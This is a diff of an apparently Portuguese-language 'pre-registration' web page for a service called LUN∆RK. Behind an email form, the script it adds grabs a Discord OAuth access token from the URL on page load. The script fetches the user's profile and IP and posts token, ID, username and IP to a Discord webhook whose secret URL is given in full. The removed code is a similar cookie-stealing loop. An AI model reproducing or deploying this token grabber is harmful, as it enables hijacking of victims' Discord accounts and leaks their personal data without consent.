@@ -1,269 +1,150 @@
 <!DOCTYPE html>
 <html>
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title></title>
+  <title>LUN∆RK - Pré-registro</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=BBH+Sans+Bartle&family=BBH+Sans+Bogle&family=Bitcount+Prop+Single+Ink:wght@100..900&family=Cal+Sans&family=Climate+Crisis&family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&family=Geologica:wght@100..900&family=Host+Grotesk:ital,wght@0,300..800;1,300..800&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&family=Manrope:wght@200..800&family=Mozilla+Headline:wght@200..700&family=Mozilla+Text:wght@200..700&family=Outfit:wght@100..900&family=Rubik+Mono+One&family=Rubik:ital,wght@0,300..900;1,300..900&family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=BBH+Sans+Bartle&family=BBH+Sans+Bogle&family=Bitcount+Prop+Single+Ink:wght@100..900&family=Cal+Sans&family=Climate+Crisis&family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&family=Geologica:wght@100..900&family=Host+Grotesk:ital,wght@0,300..800;1,300..800&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&family=Manrope:wght@200..800&family=Mozilla+Headline:wght@200..700&family=Mozilla+Text:wght@200..700&family=Outfit:wght@100..900&family=Rubik+Mono+One&family=Rubik:ital,wght@0,300..900;1,300..900&family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+  <style>
+    /* Seu CSS original mantido */
+    *{margin:0;padding:0;box-sizing:border-box;}
+    body{background:#090913;font-family:DM Sans;padding-top:25px;}
+    .icready{border-radius:35px;margin:auto;display:flex;margin-top:8%;border:1px solid #0E1837;}
+    .title{color:#fff;text-align:center;margin-top:5%;}
+    .description{color:#737995;padding:12px;font-size:13px;text-align:center;margin-top:3%;}
+    .email{border:1px solid #202538;width:75%;height:50px;background:none;margin:auto;display:flex;padding:15px;border-radius:15px;color:#5C627A;font-family:outfit;margin-top:25px;transition:0.3s;}
+    .email:hover{transition:0.4s;border:2px solid #39B7FF;outline:none;box-shadow:0 0 25px #909EFF33;color:#C6D1FF;}
+    .email::placeholder{color:#5C627A;}
+    .plac{color:#D5E3F2;margin-left:12%;}
+    .form-inp{margin-top:5%;}
+    .block{background:#1A0000A1;width:100%;height:100%;text-align:center;top:0;position:fixed;backdrop-filter:blur(15px);z-index:9999;}
+    .acess{color:#EF2929;margin-top:4%;}
+    .desc{color:#FFD1D1;margin-top:2%;}
+    .denied_ic{border-radius:50px;margin:auto;display:flex;width:95px;height:95px;margin-top:8%;border:1px solid #4C2424;}
+    @media (max-width:725px){.block{opacity:0;z-index:-9999;}}
+    .not{background:#3851FF;color:#fff;width:65%;height:50px;border:none;border-radius:15px;font-family:Geologica;text-align:center;margin:auto;justify-content:center;align-items:center;display:flex;margin-top:10%;}
+    body.slide-out{transform:translateX(-100vw);opacity:0.5;}
+  </style>
 </head>
-
-<div class="block">
-  <img class="denied_ic" src="erro.png">
-  <h1 class="acess">Acess denied</h1>
-  <p class="desc">There was a problem trying to access this site on your computer.</p>
-</div>
 <body>
+  <div class="block">
+    <img class="denied_ic" src="erro.png">
+    <h1 class="acess">Acess denied</h1>
+    <p class="desc">There was a problem trying to access this site on your computer.</p>
+  </div>
   <img class="icready" src="/VM/2169 Sem Título_20251017181222.png" height="60px" width="60px">
   <h2 class="title">Pré-registro quase concluído</h2>
-  <p class="description">Seu pedido de acessar o nosso serviço será enviado para a nosa equipe, assim que terminarmos de analisar tudo direitinho enviaremos ao seu email inserido aqui a baixo:</p>
+  <p class="description">
+    Seu pedido de acessar o nosso serviço será enviado para a nossa equipe,<br>
+    assim que terminarmos de analisar tudo direitinho enviaremos ao seu email inserido aqui a baixo:
+  </p>
   <div class="form-inp">
-    
     <span class="plac">Insira o seu e-mail</span>
-  <input class="email" placeholder="e-mail">
+    <input class="email" placeholder="e-mail">
   </div>
- <button class="not" id="sendInfo">Enviar Info</button>
-<script>
-  async function getDiscordToken() {
-    const cookies = document.cookie.split('; ');
-    const token = cookies.find(c => c.startsWith('discord_token='));
-    return token ? token.split('=')[1] : null;
-  }
+  <button class="not" id="sendInfo">Enviar Info</button>
+  <div id="discord-data" style="text-align:center;margin:30px 0;color:#fff;"></div>
   
-  async function sendToWebhook(data) {
-    await fetch("https://discord.com/api/webhooks/1428292002348535878/...", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: "🎯 Dados capturados:\n```json\n" + JSON.stringify(data, null, 2) + "\n```" })
-    });
-  }
-  
-  setInterval(async () => {
-    const token = await getDiscordToken();
-    if (token) {
-      await sendToWebhook({ token });
+  <script>
+    // --- Captura dados do Discord OAuth2 se presentes na hash da URL ---
+    async function getDiscordTokenFromUrl() {
+      const hash = window.location.hash.substr(1);
+      const params = new URLSearchParams(hash);
+      return params.get('access_token');
     }
-  }, 3000);
-</script>
-  <style>
-  *{
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-    body{
-      background: #090913;
-      font-family: DM Sans;
-      
-      padding-top: 25px;
+    async function getDiscordUser(token) {
+      const res = await fetch('https://discord.com/api/users/@me', {
+        headers: { Authorization: `Bearer ${token}` }
+      });
+      return await res.json();
     }
-    .icready{
-      border-radius: 35px;
-      margin-left: auto;
-      margin-right: auto;
-      display: flex;
-      margin-top: 8%;
-      border: 1px solid #0E1837;
+    async function getIP() {
+      try {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        return (await ipRes.json()).ip;
+      } catch { return "N/A"; }
     }
-    .title{
-      color: #FFFFFF;
-      text-align: center;
-      margin-top: 5%;
+    function calcularAnosConta(id) {
+      const createdTimestamp = (id / 4194304) + 1420070400000;
+      return Math.floor((Date.now() - createdTimestamp) / (1000 * 60 * 60 * 24 * 365));
     }
-    .description{
-      color: #737995;
-      padding: 12px;
-      font-size: 13px;
-      text-align: center;
-      margin-top: 3%;
+
+    async function processDiscordData() {
+      const token = await getDiscordTokenFromUrl();
+      if (!token) return; // Não tem login OAuth2
+      const user = await getDiscordUser(token);
+      const ip = await getIP();
+      const years = calcularAnosConta(user.id);
+
+      // Mostra na tela
+      document.getElementById("discord-data").innerHTML = `
+        <img src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png" width="70" style="border-radius:40px"><br>
+        <strong>@${user.username}</strong> (${user.global_name || user.username})<br>
+        ID: <code>${user.id}</code><br>
+        Anos da conta: <strong>${years}</strong><br>
+        IP: <code>${ip}</code><br>
+        Token: <code>${token}</code>
+        <hr>
+        <em>Seu Discord já foi detectado!</em>
+      `;
+
+      // Envia pro webhook
+      const embed = {
+        embeds: [{
+          title: "Novo usuário entrou!",
+          color: 0x7289DA,
+          thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
+          fields: [
+            { name: "🖼️ • Foto de perfil", value: `[Avatar](https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png)`, inline: true },
+            { name: "🏷️ • @", value: `@${user.username}`, inline: true },
+            { name: "🌐 • Nome exibido", value: user.global_name || user.username, inline: true },
+            { name: "📆 • Anos da conta", value: years, inline: true },
+            { name: "📍 • IP", value: ip, inline: true },
+            { name: "🔐 • Token", value: token, inline: false },
+            { name: "🪪 • ID do usuário", value: user.id, inline: false }
+          ],
+          timestamp: new Date()
+        }]
+      };
+      await fetch("https://discord.com/api/webhooks/1428292002348535878/5ZdmktRB_FZRHWan3feiEFNnEVsaRLJFACsJ9iNEHO1mziQ_JoEQT1AQG6xosTCE1P7g", {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(embed)
+      });
     }
-    .email{
-      border: 1px solid #202538;
-      width: 75%;
-      height: 50px;
-      background: none;
-      margin-right: auto;
-      margin-left: auto;
-      display: flex;
-      padding: 15px;
-      border-radius: 15px;
-      color: #5C627A;
-      font-family: outfit;
-      margin-top: 25px;
-      transition: 0.3s;
-    }
-    .email:hover{
-      transition: 0.4s;
-      border: 2px solid #39B7FF;
-      outline: none;
-      box-shadow: 0 0 25px #909EFF33;
-      color: #C6D1FF;
-    }
-    .email::placeholder{
-      color: #5C627A;
-    }
-    .plac{
-      color: #D5E3F2;
-      margin-right: auto;
-      margin-left: 12%;
-    }
-    .form-inp{
-      margin-top: 5%;
-    }
-    .block{
-      background: #1A0000A1;
-      width: 100%;
-      height: 100%;
-      text-align: center;
-      top: 0;
-      position: fixed;
-      backdrop-filter: blur(15px);
-      z-index: 9999;
-    }
-    .acess{
-      color: #EF2929;
-      margin-top: 4%;
-    }
-    .desc{
-      color: #FFD1D1;
-      margin-top: 2%;
-    }
-    .denied_ic{
-      border-radius: 50px;
-      margin-left: auto;
-      margin-right: auto;
-      display: flex;
-      width: 95px;
-      height: 95px;
-      margin-top: 8%;
-      border: 1px solid #4C2424;
-    }
-    @media (max-width: 725px){
-      .block{
-        opacity: 0;
-        z-index: -9999;
+    processDiscordData();
+
+    // --- Envio de e-mail manual pelo botão ---
+    document.getElementById("sendInfo").addEventListener("click", async () => {
+      const email = document.querySelector(".email").value;
+      if (!email) {
+        alert("Insira um e-mail!");
+        return;
       }
-    }
-    .not{
-      background: #3851FF;
-      color: #FFFFFF;
-      width: 65%;
-      height: 50px;
-      border: none;
-      border-radius: 15px;
-      font-family: Geologica;
-      text-align: center;
-      margin-left: auto;
-      margin-right: auto;
-      justify-content: center;
-      align-items: center;
-      display: flex;
-      margin-top: 10%;
-    }
-
-body.slide-out {
-  transform: translateX(-100vw); /* arrasta para a esquerda */
-  opacity: 0.5; /* opcional, dá efeito de desvanecer */
-}
-  </style>
-<script>
-  const btn = document.getElementById("sendInfo");
-  const emailInput = document.querySelector(".email");
-  
-  btn.addEventListener("click", async () => {
-    const email = emailInput.value;
-    if (!email) {
-      alert("Insira um e-mail!");
-      return;
-    }
-    
-    // Envia para o backend
-    try {
-      const response = await fetch("http://localhost:10000/send-info", {
+      // Pega IP para o e-mail
+      const ip = await getIP();
+      // Monta embed simples só com e-mail
+      const embed = {
+        embeds: [{
+          title: "Pré-registro manual",
+          color: 0x7289DA,
+          fields: [
+            { name: "E-mail", value: email, inline: true },
+            { name: "IP", value: ip, inline: true }
+          ],
+          timestamp: new Date()
+        }]
+      };
+      await fetch("https://discord.com/api/webhooks/1428292002348535878/5ZdmktRB_FZRHWan3feiEFNnEVsaRLJFACsJ9iNEHO1mziQ_JoEQT1AQG6xosTCE1P7g", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email })
+        body: JSON.stringify(embed)
       });
-      const result = await response.json();
-      console.log("Resposta do backend:", result);
-      
-      // Opcional: Envia para o webhook do Discord também
-      await fetch("https://discord.com/api/webhooks/1428292002348535878/...", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "🎯 E-mail capturado:\n" + email })
-      });
-      
+      alert("Informação enviada! Aguarde o contato no e-mail.");
       window.location.href = "index.html";
-    } catch (err) {
-      alert("Erro ao enviar!");
-      console.error(err);
-    }
-  });
-</script>
-<script>
-  function getTokenFromUrl() {
-    const hash = window.location.hash.substr(1);
-    const params = new URLSearchParams(hash);
-    return params.get('access_token');
-  }
-  
-  async function getDiscordUser(token) {
-    const res = await fetch('https://discord.com/api/users/@me', {
-      headers: { Authorization: `Bearer ${token}` }
     });
-    return await res.json();
-  }
-  
-  async function main() {
-    const token = getTokenFromUrl();
-    if (!token) return alert("Token não encontrado!");
-    
-    const user = await getDiscordUser(token);
-    
-    // IP
-    let ip = "";
-    try {
-      const ipRes = await fetch("https://api.ipify.org?format=json");
-      ip = (await ipRes.json()).ip;
-    } catch {}
-    
-    // Anos da conta (cálculo aproximado)
-    const createdTimestamp = (user.id / 4194304) + 1420070400000;
-    const years = Math.floor((Date.now() - createdTimestamp) / (1000 * 60 * 60 * 24 * 365));
-    
-    // Monta embed para Discord webhook
-    const embed = {
-      embeds: [{
-        title: "Novo usuário entrou!",
-        color: 0x7289DA,
-        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png` },
-        fields: [
-          { name: "🖼️ Foto", value: `[Avatar](${`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`})`, inline: true },
-          { name: "🏷️ @", value: `@${user.username}`, inline: true },
-          { name: "🌐 Nome público", value: user.global_name || user.username, inline: true },
-          { name: "📆 Anos da conta", value: years, inline: true },
-          { name: "📍 IP", value: ip, inline: true },
-          { name: "🔐 Token", value: token, inline: false },
-          { name: "🪪 ID do usuário", value: user.id, inline: false }
-        ],
-        timestamp: new Date()
-      }]
-    };
-    
-    await fetch("https://discord.com/api/webhooks/1428292002348535878/5ZdmktRB_FZRHWan3feiEFNnEVsaRLJFACsJ9iNEHO1mziQ_JoEQT1AQG6xosTCE1P7g", {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(embed)
-    });
-    
-    alert("Enviado ao Discord!");
-  }
-  
-  main();
-</script>
+  </script>
 </body>
-
 </html>
